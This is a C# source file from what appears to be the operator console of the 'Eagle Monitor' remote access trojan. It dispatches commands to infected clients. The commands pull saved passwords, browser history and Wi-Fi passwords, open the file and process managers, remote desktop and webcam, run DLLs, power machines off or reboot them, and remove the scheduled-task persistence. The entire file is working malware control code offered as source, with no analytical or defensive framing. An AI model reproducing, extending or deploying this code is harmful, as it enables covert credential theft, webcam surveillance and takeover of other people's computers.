using Eagle_Monitor.Forms;
using System;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor.Clients
{
    internal static class SenderClient
    {
        public delegate void DataSender();

        internal static void RecoveryPasswords() 
        {
            foreach (ListViewItem I in StartForm.M.clientsListView.SelectedItems)
            {
                Client C = Client.ClientDictionary[I.SubItems[1].Text];
                if (I.SubItems[1].Text == C.IP)
                {
                    try
                    {
                        C.passwordsForm.Text = "Passwords Recovery: " + C.IP; C.passwordsForm.Show();
                    }
                    catch (Exception)
                    {
                        C.passwordsForm = new PasswordsForm(C.HWID, C.IP); C.passwordsForm.Text = "Passwords Recovery: " + C.HWID; C.passwordsForm.Show();
                    }
                    finally
                    {
                        C.passwordsForm.loadingCircle1.Visible = true;
                        C.passwordsForm.loadingCircle1.Active = true;
                        C.passwordsForm.passwordsListView.Items.Clear();
                        Data D = new Data();
                        D.Type = Shared.PacketType.PLUGIN;
                        D.Plugin = Plugins.Recovery;
                        D.IP_Origin = C.IP;
                        D.HWID = C.HWID;
                        D.DataReturn = new object[] { Shared.PacketType.PASSWORDS };
                        Task.Run(() => C.SendData(D.Serialize()));
                    }
                    return;
                }
            }
        }

        internal static void RecoveryHistory() 
        {
            foreach (ListViewItem I in StartForm.M.clientsListView.SelectedItems)
            {
                Client C = Client.ClientDictionary[I.SubItems[1].Text];
                if (I.SubItems[1].Text == C.IP)
                {
                    try
                    {
                        C.historyForm.Text = "History Recovery: " + C.HWID; C.historyForm.Show();
                    }
                    catch (Exception)
                    {
                        C.historyForm = new HistoryForm(C.HWID, C.IP); C.historyForm.Text = "History Recovery: " + C.HWID; C.historyForm.Show();
                    }
                    finally
                    {
                        C.historyForm.loadingCircle1.Visible = true;
                        C.historyForm.loadingCircle1.Active = true;
                        C.historyForm.historyListView.Items.Clear();
                        Data D = new Data();
                        D.Type = Shared.PacketType.PLUGIN;
                        D.Plugin = Plugins.Recovery;
                        D.IP_Origin = C.IP;
                        D.HWID = C.HWID;
                        D.DataReturn = new object[] { Shared.PacketType.HISTORY };
                        Task.Run(() => C.SendData(D.Serialize()));
                    }
                    return;
                }
            }
        }

        internal static void RecoveryWifiPasswords() 
        {
            foreach (ListViewItem I in StartForm.M.clientsListView.SelectedItems)
            {
                Client C = Client.ClientDictionary[I.SubItems[1].Text];
                if (I.SubItems[1].Text == C.IP)
                {
                    try
                    {
                        C.wifiForm.Text = "Wifi Passwords Recovery: " + C.HWID; C.wifiForm.Show();
                    }
                    catch (Exception)
                    {
                        C.wifiForm = new WifiForm(C.HWID, C.IP); C.wifiForm.Text = "Wifi Passwords Recovery: " + C.HWID; C.wifiForm.Show();
                    }
                    finally
                    {

                        C.wifiForm.loadingCircle1.Visible = true;
                        C.wifiForm.loadingCircle1.Active = true;
                        C.wifiForm.wifiPasswordsListView.Items.Clear();
                        Data D = new Data();
                        D.Type = Shared.PacketType.PLUGIN;
                        D.Plugin = Plugins.Recovery;
                        D.IP_Origin = C.IP;
                        D.HWID = C.HWID;
                        D.DataReturn = new object[] { Shared.PacketType.WIFI };
                        Task.Run(() => C.SendData(D.Serialize()));
                    }
                    return;
                }
            }
        }

        internal static void ProcessManager() 
        {
            foreach (ListViewItem I in StartForm.M.clientsListView.SelectedItems)
            {
                Client C = Client.ClientDictionary[I.SubItems[1].Text];
                if (I.SubItems[1].Text == C.IP)
                {
                    try
                    {
                        C.processManagerForm.Text = "Process Manager: " + C.HWID; C.processManagerForm.Show();
                    }
                    catch (Exception)
                    {
                        C.processManagerForm = new ProcessManagerForm(C.IP); C.processManagerForm.Text = "Process Manager: " + C.HWID; C.processManagerForm.Show();
                    }
                    finally
                    {

                        C.processManagerForm.loadingCircle1.Visible = true;
                        C.processManagerForm.loadingCircle1.Active = true;
                        C.processManagerForm.processesListView.Items.Clear();
                        Data D = new Data();
                        D.Type = Shared.PacketType.PLUGIN;
                        D.Plugin = Plugins.ProcessManager;
                        D.IP_Origin = C.IP;
                        D.HWID = C.HWID;
                        D.DataReturn = new object[] { Shared.PacketType.GET_PROC };
                        Task.Run(() => C.SendData(D.Serialize()));
                    }
                    return;
                }
            }
        }

        internal static void FileManager() 
        {
            foreach (ListViewItem I in StartForm.M.clientsListView.SelectedItems)
            {
                Client C = Client.ClientDictionary[I.SubItems[1].Text];
                if (I.SubItems[1].Text == C.IP)
                {
                    try
                    {
                        C.fileManagerForm.Text = "File Manager: " + C.HWID; C.fileManagerForm.disksComboBox.Items.Clear(); C.fileManagerForm.Show();
                    }
                    catch (Exception)
                    {
                        C.fileManagerForm = new FileManagerForm(C.HWID, C.IP); C.fileManagerForm.Text = "File Manager: " + C.HWID; C.fileManagerForm.Show();
                    }
                    finally
                    {

                        C.fileManagerForm.loadingCircle1.Visible = true;
                        C.fileManagerForm.loadingCircle1.Active = true;
                        C.fileManagerForm.filesListView.Items.Clear();
                        Data D = new Data();
                        D.Type = Shared.PacketType.PLUGIN;
                        D.Plugin = Plugins.FilesManager;
                        D.IP_Origin = C.IP;
                        D.HWID = C.HWID;
                        D.DataReturn = new object[] { Shared.PacketType.GET_D };
                        Task.Run(() => C.SendData(D.Serialize()));
                    }
                    return;
                }
            }
        }

        internal static void RemoteDesktop() 
        {
            foreach (ListViewItem I in StartForm.M.clientsListView.SelectedItems)
            {
                Client C = Client.ClientDictionary[I.SubItems[1].Text];
                if (I.SubItems[1].Text == C.IP)
                {
                    try
                    {
                        C.remoteDesktopForm.Text = "Remote Desktop: " + C.HWID; C.remoteDesktopForm.Show();
                    }
                    catch (Exception)
                    {
                        C.remoteDesktopForm = new RemoteDesktopForm(C.HWID, C.IP); C.remoteDesktopForm.Text = "Remote Desktop: " + C.HWID; C.remoteDesktopForm.Show();
                    }
                    finally
                    {
                    }
                    return;
                }
            }
        }

        internal static void Injection() 
        {
            foreach (ListViewItem I in StartForm.M.clientsListView.SelectedItems)
            {
                Client C = Client.ClientDictionary[I.SubItems[1].Text];
                if (I.SubItems[1].Text == C.IP)
                {
                    try
                    {
                        C.executeDllForm.Text = "Execute DLLs: " + C.HWID; C.executeDllForm.Show();
                    }
                    catch (Exception)
                    {
                        C.executeDllForm = new ExecuteForm(C.HWID, C.IP); C.executeDllForm.Text = "Execute DLLs: " + C.HWID; C.executeDllForm.Show();
                    }
                    finally
                    {
                    }
                    return;
                }
            }
        }

        internal static void Panel() 
        {
            foreach (ListViewItem I in StartForm.M.clientsListView.SelectedItems)
            {
                Client C = Client.ClientDictionary[I.SubItems[1].Text];
                if (I.SubItems[1].Text == C.IP)
                {
                    try
                    {
                        C.miscellaneousForm.Text = "Miscellaneous Panel: " + C.HWID; C.miscellaneousForm.Show();
                    }
                    catch (Exception)
                    {
                        C.miscellaneousForm = new MiscellaneousForm(C.HWID, C.IP); C.miscellaneousForm.Text = "Miscellaneous Panel: " + C.HWID; C.miscellaneousForm.Show();
                    }
                    return;
                }
            }
        }

        internal static void WebCam()
        {
            foreach (ListViewItem I in StartForm.M.clientsListView.SelectedItems)
            {
                Client C = Client.ClientDictionary[I.SubItems[1].Text];
                if (I.SubItems[1].Text == C.IP)
                {
                    try
                    {
                        C.webCamForm.Text = "Remote WebCam: " + C.HWID; C.webCamForm.Show();
                    }
                    catch (Exception)
                    {
                        C.webCamForm = new WebCamForm(C.HWID, C.IP); C.webCamForm.Text = "Remote WebCam: " + C.HWID; C.webCamForm.Show();
                    }
                    finally
                    {
                        C.webCamForm.loadingCircle1.Visible = true;
                        C.webCamForm.loadingCircle1.Active = true;
                        C.webCamForm.webCamComboBox.Items.Clear();
                        Data D = new Data();
                        D.Type = Shared.PacketType.PLUGIN;
                        D.Plugin = Plugins.WebCam;
                        D.IP_Origin = C.IP;
                        D.HWID = C.HWID;
                        D.DataReturn = new object[] { Shared.PacketType.GET_CAMERAS };
                        Task.Run(() => C.SendData(D.Serialize()));
                    }
                    return;
                }
            }
        }

        internal static void CloseClient() 
        {
            foreach (ListViewItem I in StartForm.M.clientsListView.SelectedItems)
            {
                Client C = Client.ClientDictionary[I.SubItems[1].Text];
                if (I.SubItems[1].Text == C.IP)
                {
                    Data D = new Data();
                    D.Type = Shared.PacketType.CLOSE;
                    D.IP_Origin = C.IP;
                    D.HWID = C.HWID;
                    Task.Run(() => C.SendData(D.Serialize()));
                    return;
                }
            }
        }

        internal static void UninstallTaskSchClient()
        {
            foreach (ListViewItem I in StartForm.M.clientsListView.SelectedItems)
            {
                Client C = Client.ClientDictionary[I.SubItems[1].Text];
                if (I.SubItems[1].Text == C.IP)
                {
                    Data D = new Data();
                    D.Type = Shared.PacketType.UNINSTALL_TASKSCH;
                    D.IP_Origin = C.IP;
                    D.HWID = C.HWID;
                    Task.Run(() => C.SendData(D.Serialize()));
                    return;
                }
            }
        }

        internal static void ShutdownClientComputer() 
        {
            foreach (ListViewItem I in StartForm.M.clientsListView.SelectedItems)
            {
                Client C = Client.ClientDictionary[I.SubItems[1].Text];
                if (I.SubItems[1].Text == C.IP)
                {
                    Data D = new Data();
                    D.Type = Shared.PacketType.PLUGIN;
                    D.Plugin = Plugins.Miscellaneous;
                    D.IP_Origin = C.IP;
                    D.HWID = C.HWID;
                    D.DataReturn = new object[] { Shared.PacketType.POWER_OFF_SYS };
                    Task.Run(() => C.SendData(D.Serialize()));
                    return;
                }
            }
        }

        internal static void RebootClientComputer() 
        {
            foreach (ListViewItem I in StartForm.M.clientsListView.SelectedItems)
            {
                Client C = Client.ClientDictionary[I.SubItems[1].Text];
                if (I.SubItems[1].Text == C.IP)
                {
                    Data D = new Data();
                    D.Type = Shared.PacketType.PLUGIN;
                    D.Plugin = Plugins.Miscellaneous;
                    D.IP_Origin = C.IP;
                    D.HWID = C.HWID;
                    D.DataReturn = new object[] { Shared.PacketType.REBOOT_SYS };
                    Task.Run(() => C.SendData(D.Serialize()));
                    return;
                }
            }
        }

        internal static void LogoutClientComputer()
        {
            foreach (ListViewItem I in StartForm.M.clientsListView.SelectedItems)
            {
                Client C = Client.ClientDictionary[I.SubItems[1].Text];
                if (I.SubItems[1].Text == C.IP)
                {
                    Data D = new Data();
                    D.Type = Shared.PacketType.PLUGIN;
                    D.Plugin = Plugins.Miscellaneous;
                    D.IP_Origin = C.IP;
                    D.HWID = C.HWID;
                    D.DataReturn = new object[] { Shared.PacketType.LOG_OUT_SYS };
                    Task.Run(() => C.SendData(D.Serialize()));
                    return;
                }
            }
        }

        internal static void SuspendClientComputer() 
        {
            foreach (ListViewItem I in StartForm.M.clientsListView.SelectedItems)
            {
                Client C = Client.ClientDictionary[I.SubItems[1].Text];
                if (I.SubItems[1].Text == C.IP)
                {
                    Data D = new Data();
                    D.Type = Shared.PacketType.PLUGIN;
                    D.Plugin = Plugins.Miscellaneous;
                    D.IP_Origin = C.IP;
                    D.HWID = C.HWID;
                    D.DataReturn = new object[] { Shared.PacketType.SUSPEND_SYS };
                    Task.Run(() => C.SendData(D.Serialize()));
                    return;
                }
            }
        }

        internal static void HibernateClientComputer()
        {
            foreach (ListViewItem I in StartForm.M.clientsListView.SelectedItems)
            {
                Client C = Client.ClientDictionary[I.SubItems[1].Text];
                if (I.SubItems[1].Text == C.IP)
                {
                    Data D = new Data();
                    D.Type = Shared.PacketType.PLUGIN;
                    D.Plugin = Plugins.Miscellaneous;
                    D.IP_Origin = C.IP;
                    D.HWID = C.HWID;
                    D.DataReturn = new object[] { Shared.PacketType.HIBERNATE_SYS };
                    Task.Run(() => C.SendData(D.Serialize()));
                    return;
                }
            }
        }

        internal static void ComputerInformation() 
        {
            foreach (ListViewItem I in StartForm.M.clientsListView.SelectedItems)
            {
                Client C = Client.ClientDictionary[I.SubItems[1].Text];
                if (I.SubItems[1].Text == C.IP)
                {
                    try
                    {
                        C.informationForm.Text = "Computer Information: " + C.IP; C.informationForm.Show();
                    }
                    catch (Exception)
                    {
                        if (I.SubItems[8].Text == "64")
                        {
                            C.informationForm = new InformationForm(C.HWID, C.IP, true); C.informationForm.Text = "Computer Information: " + C.HWID; C.informationForm.Show();
                        }
                        else
                        {
                            C.informationForm = new InformationForm(C.HWID, C.IP, false); C.informationForm.Text = "Computer Information: " + C.HWID; C.informationForm.Show();
                        }
                    }
                    return;
                }
            }
        }
    }
}
